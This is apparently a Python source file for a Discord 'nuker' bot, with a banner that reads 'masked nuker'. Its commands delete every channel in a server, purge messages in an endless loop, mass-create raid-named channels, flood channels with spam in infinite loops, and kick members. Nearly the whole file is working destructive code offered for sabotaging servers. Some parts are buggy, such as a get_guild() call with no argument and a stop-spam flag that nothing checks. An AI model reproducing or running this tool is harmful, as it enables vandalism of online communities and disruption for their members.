from discord.ext import commands
from discord.errors import Forbidden
import discord.ext
from discord.ext.commands import has_permissions, MissingPermissions
from os import system,name
import discord

if name == 'nt':
    system('cls')
else:
    system('clear')

__me__ = "LiBeRtY - https://github.com/masked-github/"

header = """
                                  $$\                       $$\                           $$\                           
                                  $$ |                      $$ |                          $$ |                          
$$$$$$\$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$$ |      $$$$$$$\  $$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$  _$$  _$$\  \____$$\ $$  _____|$$ | $$  |$$  __$$\ $$  __$$ |      $$  __$$\ $$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
$$ / $$ / $$ | $$$$$$$ |\$$$$$$\  $$$$$$  / $$$$$$$$ |$$ /  $$ |      $$ |  $$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
$$ | $$ | $$ |$$  __$$ | \____$$\ $$  _$$<  $$   ____|$$ |  $$ |      $$ |  $$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
$$ | $$ | $$ |\$$$$$$$ |$$$$$$$  |$$ | \$$\ \$$$$$$$\ \$$$$$$$ |      $$ |  $$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
\__| \__| \__| \_______|\_______/ \__|  \__| \_______| \_______|      \__|  \__| \______/ \__|  \__| \_______|\__|      
"""
print(header)
client = discord.Client(intents=discord.Intents.default())
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!',intents=intents)
bot.remove_command("help")
bot.author_id = 1034074588432310272

@bot.event
async def on_ready():
    print(f"Bot: {bot.user}")
    print(f"Original prefix : ! ")
    print(f"Commands: do \033[4m\033[1m#help\033[0m\033[0m in a channel")

@bot.command(name="clear", pass_context=True)
@commands.has_permissions(manage_messages=True)
async def clear(ctx):
  while 1:
    await ctx.channel.purge(limit=1000)




@bot.command(name="nuke", pass_context=True)
@commands.has_permissions(ban_members=True)
async def nuke(ctx):
  guild = ctx.guild
  for channel in guild.channels:
    try:
      await channel.delete()
    except:pass
  for i in range(1):
    await guild.create_text_channel('masked-raid-you')

@bot.command(name="channel", pass_context=True)
@commands.has_permissions(ban_members=True)
async def channel(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')
    await guild.create_text_channel('Vive masked')

@bot.command(name="spamchannel", pass_context=True)
@commands.has_permissions(ban_members=True)
async def spamchannel(ctx, spam1, amount):
  guild = ctx.guild
  for i in range(int(amount)):await guild.create_text_channel(str(spam1.replace("+", " ")))

@bot.command(name="special", pass_context=True)
@commands.has_permissions(ban_members=True)
async def special(ctx,channeladd):
  for c in ctx.guild.channels:
    await c.delete()
  await ctx.guild.create_text_channel(channeladd.replace("+"," "))
  
@bot.command(name="spam", pass_context=True)
@commands.has_permissions(ban_members=True)
async def spam(ctx, spamtext):
  while 1:await ctx.send(str(spamtext).replace("+"," "))
  
@bot.command(name="stopspam", help="stops the spam messages")
@commands.has_permissions(ban_members=True)
async def stopspam(ctx,):
    global stop_spam_flag
    if ctx:
        stop_spam_flag = True
  
@bot.command(name="vocal", pass_context=True)
@commands.has_permissions(ban_members=True)
async def vocal(ctx,voice,amount):
  guild = ctx.guild
  for i in range(int(amount)):
      await guild.create_voice_channel('jugement')

@bot.command(name="auto", pass_context=True)
@commands.has_permissions(manage_guild=True, manage_channels=True)
async def auto(ctx):
    try:
        guild = ctx.guild
        for channel in guild.channels:
          try:
            await channel.delete()
          except:pass
        guild = bot.get_guild()
        
        category = await guild.create_category("Terminal", overwrites=None, reason=None)
        await guild.create_text_channel('welcome+!', overwrites=None, category=category, reason=None)
        await guild.create_text_channel('goodbye+!', overwrites=None, category=category, reason=None)
        category2 = await guild.create_category("Talk", overwrites=None, reason=None)
        await guild.create_text_channel('chat+!', overwrites=None, category=category2, reason=None)
        await guild.create_text_channel('medias+!', overwrites=None, category=category2, reason=None)
        await guild.create_text_channel('memes+!', overwrites=None, category=category2, reason=None)
        category3 = await guild.create_category("Play/ Laugh" , overwrites=None, reason=None)
        await guild.create_voice_channel('vocal 1 !', overwrites=None, category=category3, reason=None)
        await guild.create_voice_channel('vocal 2 !', overwrites=None, category=category3, reason=None)
        await ctx.send("Setup finished!")
    except Exception as errors:
        print(f"Bot Error: {errors}")


@bot.command(name="kick", pass_context=True)
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    if await member.kick(reason=reason):
      await ctx.send(f'{member} à été kick du serveur.')
    else:
      await ctx.send(f'{member} ne peux pas être kick du serveur.')

token = "Your token"
bot.run(token)
client.run(token)
